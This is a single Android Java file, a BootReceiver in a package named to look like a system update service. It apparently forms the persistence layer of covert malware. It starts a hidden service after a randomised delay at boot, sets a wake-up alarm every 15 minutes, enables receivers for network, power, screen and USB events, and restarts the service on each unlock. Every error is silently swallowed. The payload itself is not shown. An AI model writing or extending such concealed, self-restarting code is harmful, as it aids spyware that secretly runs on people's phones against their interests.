// BootReceiver.java
// BootReceiver.java
package com.system.service.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.ActivityManager;
import android.content.pm.PackageManager;

public class BootReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if (action == null) {
            return;
        }
        
        switch (action) {
            case Intent.ACTION_BOOT_COMPLETED:
            case "android.intent.action.QUICKBOOT_POWERON":
            case Intent.ACTION_LOCKED_BOOT_COMPLETED:
                scheduleDelayedStart(context);
                break;
            case Intent.ACTION_USER_PRESENT:
                checkServiceStatus(context);
                break;
        }
    }
    
    private void scheduleDelayedStart(Context context) {
        long delay = 30000 + (long)(Math.random() * 90000);
        
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                startServices(context);
            }
        }, delay);
    }
    
    private void startServices(Context context) {
        try {
            Intent serviceIntent = new Intent(context, SystemService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            
            scheduleAlarms(context);
            enableReceivers(context);
            
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void scheduleAlarms(Context context) {
        try {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            if (alarmManager == null) return;
            
            Intent alarmIntent = new Intent(context, AlarmReceiver.class);
            
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= 31) {
                flags = flags | 0x4000000;
            }
            
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                context, 0, alarmIntent, flags
            );
            
            alarmManager.setInexactRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                60000,
                900000,
                pendingIntent
            );
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void enableReceivers(Context context) {
        try {
            PackageManager pm = context.getPackageManager();
            String packageName = context.getPackageName();
            
            String[] receivers = {
                "ConnectivityReceiver",
                "PowerReceiver",
                "ScreenReceiver",
                "USBReceiver"
            };
            
            for (String receiver : receivers) {
                android.content.ComponentName component = 
                    new android.content.ComponentName(packageName, packageName + "." + receiver);
                pm.setComponentEnabledSetting(
                    component,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                );
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void checkServiceStatus(Context context) {
        try {
            ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            if (manager != null) {
                String packageName = context.getPackageName();
                boolean running = false;
                
                for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                    if (service.service.getClassName().contains(packageName)) {
                        running = true;
                        break;
                    }
                }
                
                if (!running) {
                    startServices(context);
                }
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
}
